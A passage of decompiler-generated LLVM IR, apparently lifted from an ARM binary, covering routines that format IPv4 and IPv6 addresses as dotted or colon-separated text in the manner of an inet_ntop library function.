  %v1_13fb0 = phi i32 [ %v0_13fac, %dec_label_pc_13fac ], [ %v1_13fb0.pre, %dec_label_pc_13f6c ]
  %v9_13fb0 = icmp eq i32 %v0_13fb0, %v1_13fb0
  br i1 %v9_13fb0, label %dec_label_pc_13fb8, label %dec_label_pc_13fe4

dec_label_pc_13fb8:                               ; preds = %dec_label_pc_13fb0
  store i32 16, i32* @r2, align 4
  %v2_13fbc = load i32, i32* %stack_var_-60, align 4
  store i32 %v2_13fbc, i32* @r0, align 4
  store i32 %v2_13e20, i32* @r1, align 4
  %v0_13fc4 = call i32 @function_ef60()
  store i32 %v0_13fc4, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13fe8

dec_label_pc_13fd0:                               ; preds = %dec_label_pc_13e00
  %v0_13fd0 = call i32 @function_cec4()
  store i32 %v0_13fd0, i32* %r0.global-to-local, align 4
  store i32 97, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_13fdc = inttoptr i32 %v0_13fd0 to i32*
  store i32 97, i32* %v2_13fdc, align 4
  %v0_13fe8.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13fe8

dec_label_pc_13fe4:                               ; preds = %dec_label_pc_13e80, %dec_label_pc_13ea8, %dec_label_pc_13ec8, %dec_label_pc_13ebc, %dec_label_pc_13f0c, %dec_label_pc_13f74, %dec_label_pc_13ef8, %dec_label_pc_13fb0, %dec_label_pc_13e44, %dec_label_pc_13f4c, %dec_label_pc_13f00
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13fe8

dec_label_pc_13fe8:                               ; preds = %dec_label_pc_13fd0, %dec_label_pc_13fb8, %dec_label_pc_13e0c, %dec_label_pc_13fe4
  %v0_13fe8 = phi i32 [ %v0_13fe8.pre, %dec_label_pc_13fd0 ], [ 1, %dec_label_pc_13fb8 ], [ %v4_13e14, %dec_label_pc_13e0c ], [ 0, %dec_label_pc_13fe4 ]
  store i32 %v0_13fe8, i32* %r0.global-to-local, align 4
  store i32 %v3_13de8, i32* @r4, align 4
  store i32 %v6_13de8, i32* @r5, align 4
  store i32 %v9_13de8, i32* @r6, align 4
  ret i32 %v0_13fe8

; uselistorder directives
  uselistorder i32 %v0_13fe8, { 1, 0 }
  uselistorder i32 %v2_13fa0, { 1, 0 }
  uselistorder i32 %v2_13f9c, { 1, 0 }
  uselistorder i32 %v0_13fa4, { 0, 1, 3, 2 }
  uselistorder i32 %v0_13fac, { 1, 0, 2, 3 }
  uselistorder i32 %v1_13fb0.pre, { 0, 2, 1 }
  uselistorder i32 %v0_13fb0.pre, { 2, 0, 1 }
  uselistorder i32 %v3_13f5c, { 1, 0 }
  uselistorder i32 %v0_13fb0.pre.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_13f34, { 1, 2, 3, 0 }
  uselistorder i32 %v0_13f10, { 1, 0 }
  uselistorder i32 %v3_13ed4, { 1, 0 }
  uselistorder i32 %v0_13ec8, { 1, 0, 2 }
  uselistorder i32 %v1_13e78, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v3_13e70, { 1, 0 }
  uselistorder i32 %v0_13e54, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 0, 4, 5, 1, 6, 7 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 5, 6, 4, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32* %r2.global-to-local, { 3, 1, 2, 4, 6, 5, 7, 8, 9, 10, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 5, 3, 4, 16, 9, 7, 6, 17, 8, 15, 14, 11, 10, 13, 12, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 0 }
  uselistorder i32* %fp.global-to-local, { 1, 2, 3, 0, 4, 5 }
  uselistorder i8 1, { 2, 0, 1, 3, 4, 5, 6, 7 }
  uselistorder i32 (i32)* @function_14a94, { 1, 0 }
  uselistorder label %dec_label_pc_13fe8, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_13fe4, { 7, 5, 9, 4, 10, 6, 2, 3, 1, 0, 8 }
  uselistorder label %dec_label_pc_13fb0, { 1, 0 }
  uselistorder label %dec_label_pc_13f98, { 1, 0 }
  uselistorder label %dec_label_pc_13f6c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13f30.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_13e64, { 1, 0 }
}

define i32 @function_13ff8(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_13ff8:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-51 = alloca i32, align 4
  %stack_var_-53 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_13ff8 = load i32, i32* @r4, align 4
  store i32 %v3_13ff8, i32* %stack_var_-36, align 4
  store i32 %arg3, i32* %stack_var_-64, align 4
  store i32 ptrtoint (i32* @global_var_17540.618 to i32), i32* @r1, align 4
  store i32 2, i32* @r2, align 4
  store i32 %arg1, i32* %fp.global-to-local, align 4
  %v2_14014 = ptrtoint i32* %stack_var_-53 to i32
  store i32 %v2_14014, i32* @r0, align 4
  %v0_14018 = call i32 @function_ef60()
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 15, i32* @r2, align 4
  %v2_14028 = bitcast i32* %stack_var_-51 to i8*
  %v3_14028 = call i32 @function_ef70(i8* %v2_14028, i32 0)
  store i32 0, i32* %r8.global-to-local, align 4
  %v2_140f0 = ptrtoint i32* %stack_var_-36 to i32
  %v2_140cc = add i32 %v2_140f0, -17
  br label %dec_label_pc_140f0

dec_label_pc_14038:                               ; preds = %dec_label_pc_140f0
  %v0_14038 = load i32, i32* %fp.global-to-local, align 4
  %v2_14038 = add i32 %v0_14038, %v1_14038
  %v3_14038 = inttoptr i32 %v2_14038 to i8*
  %v4_14038 = load i8, i8* %v3_14038, align 1
  %v6_14038 = zext i8 %v4_14038 to i32
  store i32 %v6_14038, i32* %r4.global-to-local, align 4
  %v1_1403c = add i32 %v0_1403c, 1
  store i32 %v1_1403c, i32* %r7.global-to-local, align 4
  store i32 %v2_140f0, i32* %r2.global-to-local, align 4
  store i32 %v6_14038, i32* @r0, align 4
  %v2_14048 = add i32 %v1_1403c, %v2_140f0
  store i32 %v2_14048, i32* %sl.global-to-local, align 4
  %v0_1404c = call i32 @function_14d90()
  %v1_14050 = add i32 %v0_1404c, 48
  %v1_14054 = trunc i32 %v1_14050 to i8
  %v2_14054 = load i32, i32* %r5.global-to-local, align 4
  %v3_14054 = add i32 %v2_14054, -17
  %v4_14054 = inttoptr i32 %v3_14054 to i8*
  store i8 %v1_14054, i8* %v4_14054, align 1
  %v0_14058 = load i32, i32* %r5.global-to-local, align 4
  %v1_14058 = add i32 %v0_14058, -17
  %v2_14058 = inttoptr i32 %v1_14058 to i8*
  %v3_14058 = load i8, i8* %v2_14058, align 1
  %v7_1405c = icmp eq i8 %v3_14058, 48
  %v0_14060 = load i32, i32* %fp.global-to-local, align 4
  %v1_14060 = load i32, i32* %r8.global-to-local, align 4
  %v2_14060 = add i32 %v1_14060, %v0_14060
  store i32 %v2_14060, i32* %sb.global-to-local, align 4
  store i32 10, i32* @r1, align 4
  %v0_14068 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_14068, i32* @r0, align 4
  br i1 %v7_1405c, label %dec_label_pc_14070, label %dec_label_pc_14098

dec_label_pc_14070:                               ; preds = %dec_label_pc_14038
  %v0_14070 = call i32 @function_14d90()
  store i32 10, i32* %r1.global-to-local, align 4
  %v1_14078 = urem i32 %v0_14070, 256
  %v2_1407c = call i32 @function_ca30(i32 %v1_14078, i32 10)
  %v1_14080 = add i32 %v2_1407c, 48
  %v1_14084 = trunc i32 %v1_14080 to i8
  %v2_14084 = load i32, i32* %r5.global-to-local, align 4
  %v3_14084 = add i32 %v2_14084, -17
  %v4_14084 = inttoptr i32 %v3_14084 to i8*
  store i8 %v1_14084, i8* %v4_14084, align 1
  %v0_14088 = load i32, i32* %r5.global-to-local, align 4
  %v1_14088 = add i32 %v0_14088, -17
  %v2_14088 = inttoptr i32 %v1_14088 to i8*
  %v3_14088 = load i8, i8* %v2_14088, align 1
  %v7_1408c = icmp eq i8 %v3_14088, 48
  br i1 %v7_1408c, label %dec_label_pc_140bc, label %bb

bb:                                               ; preds = %dec_label_pc_14070
  %v1_14090 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_14090, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_140bc

dec_label_pc_14098:                               ; preds = %dec_label_pc_14038
  store i32 10, i32* @r1, align 4
  store i32 %v0_14068, i32* @r0, align 4
  %v0_140a0 = call i32 @function_14d90()
  store i32 10, i32* %r1.global-to-local, align 4
  %v1_140a8 = urem i32 %v0_140a0, 256
  %v2_140ac = call i32 @function_ca30(i32 %v1_140a8, i32 10)
  %v1_140b0 = add i32 %v2_140ac, 48
  %v1_140b4 = trunc i32 %v1_140b0 to i8
  %v2_140b4 = load i32, i32* %sl.global-to-local, align 4
  %v3_140b4 = add i32 %v2_140b4, -17
  %v4_140b4 = inttoptr i32 %v3_140b4 to i8*
  store i8 %v1_140b4, i8* %v4_140b4, align 1
  %v0_140b8 = load i32, i32* %r7.global-to-local, align 4
  %v1_140b8 = add i32 %v0_140b8, 1
  store i32 %v1_140b8, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_140bc

dec_label_pc_140bc:                               ; preds = %bb, %dec_label_pc_14070, %dec_label_pc_14098
  %v0_140bc = load i32, i32* %sb.global-to-local, align 4
  %v1_140bc = inttoptr i32 %v0_140bc to i8*
  %v2_140bc = load i8, i8* %v1_140bc, align 1
  %v3_140bc = zext i8 %v2_140bc to i32
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_140c4 = call i32 @function_ca30(i32 %v3_140bc, i32 10)
  store i32 %v2_140f0, i32* %ip.global-to-local, align 4
  %v1_140cc = load i32, i32* %r6.global-to-local, align 4
  %v1_140d0 = add i32 %v1_140cc, 1
  store i32 %v1_140d0, i32* %r1.global-to-local, align 4
  %v1_140d4 = add i32 %v2_140c4, 48
  %v1_140d8 = trunc i32 %v1_140d4 to i8
  %v3_140d8 = add i32 %v2_140cc, %v1_140cc
  %v4_140d8 = inttoptr i32 %v3_140d8 to i8*
  store i8 %v1_140d8, i8* %v4_140d8, align 1
  %v0_140dc = load i32, i32* %ip.global-to-local, align 4
  %v1_140dc = load i32, i32* %r1.global-to-local, align 4
  %v2_140dc = add i32 %v1_140dc, %v0_140dc
  store i32 %v2_140dc, i32* %r2.global-to-local, align 4
  %v3_140e4 = add i32 %v2_140dc, -17
  %v4_140e4 = inttoptr i32 %v3_140e4 to i8*
  store i8 46, i8* %v4_140e4, align 1
  %v0_140e8 = load i32, i32* %r8.global-to-local, align 4
  %v1_140e8 = add i32 %v0_140e8, 1
  store i32 %v1_140e8, i32* %r8.global-to-local, align 4
  %v0_140ec = load i32, i32* %r1.global-to-local, align 4
  %v1_140ec = add i32 %v0_140ec, 1
  br label %dec_label_pc_140f0

dec_label_pc_140f0:                               ; preds = %dec_label_pc_13ff8, %dec_label_pc_140bc
  %v0_1403c = phi i32 [ 0, %dec_label_pc_13ff8 ], [ %v1_140ec, %dec_label_pc_140bc ]
  %v1_14038 = phi i32 [ 0, %dec_label_pc_13ff8 ], [ %v1_140e8, %dec_label_pc_140bc ]
  store i32 %v2_140f0, i32* %r2.global-to-local, align 4
  store i32 100, i32* @r1, align 4
  store i32 %v0_1403c, i32* %r6.global-to-local, align 4
  %v2_14100 = add i32 %v0_1403c, %v2_140f0
  store i32 %v2_14100, i32* %r5.global-to-local, align 4
  %v7_14104 = icmp sgt i32 %v1_14038, 3
  br i1 %v7_14104, label %dec_label_pc_14108, label %dec_label_pc_14038

dec_label_pc_14108:                               ; preds = %dec_label_pc_140f0
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %v2_14014, i32* %r4.global-to-local, align 4
  %v3_14110 = add i32 %v2_14100, -18
  %v4_14110 = inttoptr i32 %v3_14110 to i8*
  store i8 0, i8* %v4_14110, align 1
  store i32 %v2_14014, i32* @r0, align 4
  %v0_14118 = call i32 @function_f030()
  %v2_1411c = load i32, i32* %stack_var_-64, align 4
  %tmp = icmp ugt i32 %v0_14118, %v2_1411c
  br i1 %tmp, label %dec_label_pc_14128, label %dec_label_pc_1413c

dec_label_pc_14128:                               ; preds = %dec_label_pc_14108
  %v0_14128 = call i32 @function_cec4()
  %v0_14130 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_14130, i32* %r2.global-to-local, align 4
  %v2_14134 = inttoptr i32 %v0_14128 to i32*
  store i32 28, i32* %v2_14134, align 4
  %v0_1414c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1414c

dec_label_pc_1413c:                               ; preds = %dec_label_pc_14108
  store i32 %v2_14014, i32* %r1.global-to-local, align 4
  %v2_14144 = bitcast i32* %stack_var_-53 to i8*
  %v3_14144 = call i32 @function_f090(i32 %arg2, i8* %v2_14144)
  store i32 %v3_14144, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1414c

dec_label_pc_1414c:                               ; preds = %dec_label_pc_14128, %dec_label_pc_1413c
  %v0_1414c = phi i32 [ %v0_1414c.pre, %dec_label_pc_14128 ], [ %v3_14144, %dec_label_pc_1413c ]
  %v2_14154 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_14154, i32* @r4, align 4
  ret i32 %v0_1414c

; uselistorder directives
  uselistorder i32 %v1_14038, { 1, 0 }
  uselistorder i32 %v0_1403c, { 0, 2, 1 }
  uselistorder i32 %v2_140f0, { 0, 5, 3, 2, 4, 1 }
  uselistorder i32* %stack_var_-36, { 0, 2, 1 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 5, 4, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 4, 0, 1, 2, 3 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 6, 4, 5, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32 (i32, i32)* @function_ca30, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 10, 0 }
  uselistorder i8 48, { 3, 4, 0, 1, 2, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 -17, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_1414c, { 1, 0 }
  uselistorder label %dec_label_pc_140f0, { 1, 0 }
  uselistorder label %dec_label_pc_140bc, { 2, 0, 1 }
}

define i32 @function_1415c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1415c:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-110 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_1415c = load i32, i32* @r4, align 4
  store i32 %v3_1415c, i32* %stack_var_-32, align 4
  %v6_1415c = load i32, i32* @r5, align 4
  %v25_1415c = ptrtoint i32* %stack_var_-32 to i32
  %v7_14160 = icmp eq i32 %arg1, 2
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg3, i32* @sb, align 4
  store i32 %arg4, i32* @sl, align 4
  br i1 %v7_14160, label %dec_label_pc_14184, label %dec_label_pc_14178

dec_label_pc_14178:                               ; preds = %dec_label_pc_1415c
  %v7_14178 = icmp eq i32 %arg1, 10
  br i1 %v7_14178, label %dec_label_pc_14198, label %dec_label_pc_14398

dec_label_pc_14184:                               ; preds = %dec_label_pc_1415c
  store i32 %arg3, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* %r2.global-to-local, align 4
  %v3_14190 = call i32 @function_13ff8(i32 %arg2, i32 %arg3, i32 %arg4)
  br label %dec_label_pc_14390

dec_label_pc_14198:                               ; preds = %dec_label_pc_14178
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 32, i32* @r2, align 4
  %v2_141a4 = bitcast i32* %stack_var_-64 to i8*
  %v3_141a4 = call i32 @function_ef70(i8* %v2_141a4, i32 0)
  br label %dec_label_pc_141c4

dec_label_pc_141b0:                               ; preds = %dec_label_pc_141c4
  %tmp68 = icmp slt i32 %v1_141b4, 0
  %v4_141c4 = zext i1 %tmp68 to i32
  %v5_141c4 = add i32 %v4_141c4, %v1_141b4
  %v3_141c8 = sdiv i32 %v5_141c4, 2
  %v4_141d8 = mul i32 %v3_141c8, 4
  %v5_141d8 = add i32 %v4_141d8, %v25_1415c
  %v1_141b0 = add i32 %v2_141d4, 1
  %v2_141b0 = inttoptr i32 %v1_141b0 to i8*
  %v3_141b0 = load i8, i8* %v2_141b0, align 1
  %v4_141b0 = zext i8 %v3_141b0 to i32
  %v3_141b4 = inttoptr i32 %v2_141d4 to i8*
  %v4_141b4 = load i8, i8* %v3_141b4, align 1
  %v6_141b4 = zext i8 %v4_141b4 to i32
  store i32 %v6_141b4, i32* %r2.global-to-local, align 4
  %v4_141b8 = mul nuw nsw i32 %v6_141b4, 256
  %v5_141b8 = or i32 %v4_141b8, %v4_141b0
  %v2_141bc = add i32 %v5_141d8, -32
  %v3_141bc = inttoptr i32 %v2_141bc to i32*
  store i32 %v5_141b8, i32* %v3_141bc, align 4
  %v0_141c0 = load i32, i32* %r1.global-to-local, align 4
  %v1_141c0 = add i32 %v0_141c0, 2
  br label %dec_label_pc_141c4

dec_label_pc_141c4:                               ; preds = %dec_label_pc_14198, %dec_label_pc_141b0
  %v1_141b4 = phi i32 [ 0, %dec_label_pc_14198 ], [ %v1_141c0, %dec_label_pc_141b0 ]
  store i32 %v1_141b4, i32* %r1.global-to-local, align 4
  %v0_141d4 = load i32, i32* @r8, align 4
  %v2_141d4 = add i32 %v0_141d4, %v1_141b4
  store i32 %v2_141d4, i32* %r2.global-to-local, align 4
  %v7_141dc = icmp sgt i32 %v1_141b4, 15
  br i1 %v7_141dc, label %dec_label_pc_141e0, label %dec_label_pc_141b0

dec_label_pc_141e0:                               ; preds = %dec_label_pc_141c4
  store i32 -1, i32* @r6, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_141f0

dec_label_pc_141f0:                               ; preds = %dec_label_pc_141e0, %dec_label_pc_1423c
  %v0_14230 = phi i32 [ -1, %dec_label_pc_141e0 ], [ %v0_14264, %dec_label_pc_1423c ]
  %v0_14220 = phi i32 [ -1, %dec_label_pc_141e0 ], [ %v0_14250, %dec_label_pc_1423c ]
  %v0_14204 = phi i32 [ -1, %dec_label_pc_141e0 ], [ %v0_142048, %dec_label_pc_1423c ]
  %v0_1423c = phi i32 [ 0, %dec_label_pc_141e0 ], [ %v1_1423c, %dec_label_pc_1423c ]
  %v4_141f4 = mul nuw nsw i32 %v0_1423c, 4
  %v5_141f4 = add i32 %v4_141f4, %v25_1415c
  %v1_141f8 = add i32 %v5_141f4, -32
  %v2_141f8 = inttoptr i32 %v1_141f8 to i32*
  %v3_141f8 = load i32, i32* %v2_141f8, align 4
  %v2_141fc = icmp eq i32 %v3_141f8, 0
  %v7_14204 = icmp eq i32 %v0_14204, -1
  br i1 %v2_141fc, label %dec_label_pc_14204, label %dec_label_pc_14218

dec_label_pc_14204:                               ; preds = %dec_label_pc_141f0
  br i1 %v7_14204, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_14204
  store i32 %v0_1423c, i32* %r2.global-to-local, align 4
  store i32 1, i32* @r4, align 4
  br label %dec_label_pc_1423c

.thread:                                          ; preds = %dec_label_pc_14204
  %v1_14210.pre = load i32, i32* @r4, align 4
  %v2_14210 = add i32 %v1_14210.pre, 1
  store i32 %v2_14210, i32* @r4, align 4
  br label %dec_label_pc_1423c

dec_label_pc_14218:                               ; preds = %dec_label_pc_141f0
  br i1 %v7_14204, label %dec_label_pc_1423c, label %dec_label_pc_14220

dec_label_pc_14220:                               ; preds = %dec_label_pc_14218
  %v7_14220 = icmp eq i32 %v0_14220, -1
  %v0_14234.pre = load i32, i32* @r4, align 4
  %v1_14228 = load i32, i32* @r7, align 4
  %v7_1422c = icmp sgt i32 %v0_14234.pre, %v1_14228
  %or.cond = or i1 %v7_14220, %v7_1422c
  br i1 %or.cond, label %dec_label_pc_14230, label %dec_label_pc_14238

dec_label_pc_14230:                               ; preds = %dec_label_pc_14220
  store i32 %v0_14230, i32* @r6, align 4
  store i32 %v0_14234.pre, i32* @r7, align 4
  br label %dec_label_pc_14238

dec_label_pc_14238:                               ; preds = %dec_label_pc_14220, %dec_label_pc_14230
  %v0_1422013 = phi i32 [ %v0_14230, %dec_label_pc_14230 ], [ %v0_14220, %dec_label_pc_14220 ]
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1423c

dec_label_pc_1423c:                               ; preds = %bb, %.thread, %dec_label_pc_14218, %dec_label_pc_14238
  %v0_14264 = phi i32 [ %v0_14230, %.thread ], [ %v0_1423c, %bb ], [ %v0_14230, %dec_label_pc_14218 ], [ -1, %dec_label_pc_14238 ]
  %v0_142048 = phi i32 [ %v0_14204, %.thread ], [ %v0_1423c, %bb ], [ -1, %dec_label_pc_14218 ], [ -1, %dec_label_pc_14238 ]
  %v0_14250 = phi i32 [ %v0_14220, %.thread ], [ %v0_14220, %bb ], [ %v0_14220, %dec_label_pc_14218 ], [ %v0_1422013, %dec_label_pc_14238 ]
  %v1_1423c = add nuw nsw i32 %v0_1423c, 1
  store i32 %v1_1423c, i32* %r1.global-to-local, align 4
  %v7_14244 = icmp slt i32 %v1_1423c, 8
  br i1 %v7_14244, label %dec_label_pc_141f0, label %dec_label_pc_14248

dec_label_pc_14248:                               ; preds = %dec_label_pc_1423c
  %v7_14248 = icmp eq i32 %v0_14264, -1
  br i1 %v7_14248, label %dec_label_pc_14268, label %dec_label_pc_14250

dec_label_pc_14250:                               ; preds = %dec_label_pc_14248
  %v7_14250 = icmp eq i32 %v0_14250, -1
  %v0_14260.pre = load i32, i32* @r4, align 4
  br i1 %v7_14250, label %dec_label_pc_14260, label %dec_label_pc_14258

dec_label_pc_14258:                               ; preds = %dec_label_pc_14250
  %v1_14258 = load i32, i32* @r7, align 4
  %v7_1425c = icmp sgt i32 %v0_14260.pre, %v1_14258
  br i1 %v7_1425c, label %dec_label_pc_14260, label %dec_label_pc_14268

dec_label_pc_14260:                               ; preds = %dec_label_pc_14250, %dec_label_pc_14258
  store i32 %v0_14260.pre, i32* @r7, align 4
  store i32 %v0_14264, i32* @r6, align 4
  br label %dec_label_pc_14268

dec_label_pc_14268:                               ; preds = %dec_label_pc_14258, %dec_label_pc_14248, %dec_label_pc_14260
  %v0_14268 = phi i32 [ %v0_14250, %dec_label_pc_14258 ], [ %v0_14250, %dec_label_pc_14248 ], [ %v0_14264, %dec_label_pc_14260 ]
  %v7_14268 = icmp eq i32 %v0_14268, -1
  br i1 %v7_14268, label %bb49, label %dec_label_pc_14270

dec_label_pc_14270:                               ; preds = %dec_label_pc_14268
  %v0_14270 = load i32, i32* @r7, align 4
  %v7_14274 = icmp slt i32 %v0_14270, 2
  br i1 %v7_14274, label %bb48, label %bb49

bb48:                                             ; preds = %dec_label_pc_14270
  store i32 -1, i32* @r6, align 4
  br label %bb49

bb49:                                             ; preds = %dec_label_pc_14268, %dec_label_pc_14270, %bb48
  %v0_1428423 = phi i32 [ %v0_14268, %dec_label_pc_14268 ], [ %v0_14268, %dec_label_pc_14270 ], [ -1, %bb48 ]
  %v2_14278 = ptrtoint i32* %stack_var_-110 to i32
  store i32 %v2_14278, i32* @r4, align 4
  %v9_142e4 = icmp eq i32 %tmp, 65535
  store i32 0, i32* @r5, align 4
  %v7_1428463 = icmp eq i32 %v0_1428423, -1
  br label %dec_label_pc_14284

dec_label_pc_14284:                               ; preds = %bb49, %dec_label_pc_14338
  %v7_1428467 = phi i1 [ %v7_1428463, %bb49 ], [ %v7_14284, %dec_label_pc_14338 ]
  %v0_142b066 = phi i32 [ 0, %bb49 ], [ %v1_14338, %dec_label_pc_14338 ]
  %v1_142a065 = phi i32 [ %v0_1428423, %bb49 ], [ %v0_14284.pre, %dec_label_pc_14338 ]
  %v3_142b864 = phi i32 [ %v2_14278, %bb49 ], [ %v3_142a824, %dec_label_pc_14338 ]
  br i1 %v7_1428467, label %dec_label_pc_142b0, label %dec_label_pc_1428c

dec_label_pc_1428c:                               ; preds = %dec_label_pc_14284
  %v9_1428c = icmp eq i32 %v0_142b066, %v1_142a065
  %v5_14290 = icmp slt i32 %v0_142b066, %v1_142a065
  br i1 %v5_14290, label %dec_label_pc_142b0, label %dec_label_pc_14294

dec_label_pc_14294:                               ; preds = %dec_label_pc_1428c
  %v1_14294 = load i32, i32* @r7, align 4
  %v2_14294 = add i32 %v1_14294, %v1_142a065
  %v6_1429c = icmp slt i32 %v0_142b066, %v2_14294
  br i1 %v6_1429c, label %dec_label_pc_142a0, label %dec_label_pc_142b0

dec_label_pc_142a0:                               ; preds = %dec_label_pc_14294
  br i1 %v9_1428c, label %bb51, label %dec_label_pc_14338

bb51:                                             ; preds = %dec_label_pc_142a0
  %v4_142a8 = inttoptr i32 %v3_142b864 to i8*
  store i8 58, i8* %v4_142a8, align 1
  %v5_142a8 = load i32, i32* @r4, align 4
  %v6_142a8 = add i32 %v5_142a8, 1
  store i32 %v6_142a8, i32* @r4, align 4
  br label %dec_label_pc_14338

dec_label_pc_142b0:                               ; preds = %dec_label_pc_14294, %dec_label_pc_1428c, %dec_label_pc_14284
  %v2_142b0 = icmp eq i32 %v0_142b066, 0
  br i1 %v2_142b0, label %.thread3, label %bb52

bb52:                                             ; preds = %dec_label_pc_142b0
  %v4_142b8 = inttoptr i32 %v3_142b864 to i8*
  store i8 58, i8* %v4_142b8, align 1
  %v5_142b8 = load i32, i32* @r4, align 4
  %v6_142b8 = add i32 %v5_142b8, 1
  store i32 %v6_142b8, i32* @r4, align 4
  %v0_142bc.pre = load i32, i32* @r5, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_142b0, %bb52
  %v0_142fc = phi i32 [ %v3_142b864, %dec_label_pc_142b0 ], [ %v6_142b8, %bb52 ]
  %v1_14320 = phi i32 [ 0, %dec_label_pc_142b0 ], [ %v0_142bc.pre, %bb52 ]
  %v7_142bc = icmp eq i32 %v1_14320, 6
  br i1 %v7_142bc, label %dec_label_pc_142c4, label %dec_label_pc_1431c

dec_label_pc_142c4:                               ; preds = %.thread3
  %v0_142c4 = load i32, i32* @r6, align 4
  %v2_142c4 = icmp eq i32 %v0_142c4, 0
  br i1 %v2_142c4, label %dec_label_pc_142cc, label %dec_label_pc_1431c

dec_label_pc_142cc:                               ; preds = %dec_label_pc_142c4
  %v0_142cc = load i32, i32* @r7, align 4
  %v7_142cc = icmp eq i32 %v0_142cc, 6
  br i1 %v7_142cc, label %dec_label_pc_142ec, label %dec_label_pc_142d4

dec_label_pc_142d4:                               ; preds = %dec_label_pc_142cc
  %v7_142d4 = icmp eq i32 %v0_142cc, 5
  br i1 %v7_142d4, label %dec_label_pc_142dc, label %dec_label_pc_1431c

dec_label_pc_142dc:                               ; preds = %dec_label_pc_142d4
  store i32 %tmp, i32* %r2.global-to-local, align 4
  br i1 %v9_142e4, label %dec_label_pc_142ec, label %dec_label_pc_1431c

dec_label_pc_142ec:                               ; preds = %dec_label_pc_142dc, %dec_label_pc_142cc
  %v2_142f0 = sub i32 %v25_1415c, %v0_142fc
  %v0_142f4 = load i32, i32* @r8, align 4
  %v1_142f4 = add i32 %v0_142f4, 12
  %v1_142f8 = add i32 %v2_142f0, -32
  store i32 %v1_142f8, i32* %r2.global-to-local, align 4
  store i32 %v0_142fc, i32* %r1.global-to-local, align 4
  %v3_14300 = call i32 @function_13ff8(i32 %v1_142f4, i32 %v0_142fc, i32 %v1_142f8)
  %v2_14304 = icmp eq i32 %v3_14300, 0
  br i1 %v2_14304, label %dec_label_pc_14390, label %dec_label_pc_1430c

dec_label_pc_1430c:                               ; preds = %dec_label_pc_142ec
  %v0_1430c = load i32, i32* @r4, align 4
  store i32 %v0_1430c, i32* @r0, align 4
  %v0_14310 = call i32 @function_f030()
  %v0_14314 = load i32, i32* @r4, align 4
  %v2_14314 = add i32 %v0_14314, %v0_14310
  store i32 %v2_14314, i32* @r4, align 4
  %v0_1434c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1434c

dec_label_pc_1431c:                               ; preds = %dec_label_pc_142dc, %dec_label_pc_142d4, %dec_label_pc_142c4, %.thread3
  %v4_14320 = mul i32 %v1_14320, 4
  %v5_14320 = add i32 %v4_14320, %v25_1415c
  store i32 %v0_142fc, i32* @r0, align 4
  %v1_14328 = add i32 %v5_14320, -32
  %v2_14328 = inttoptr i32 %v1_14328 to i32*
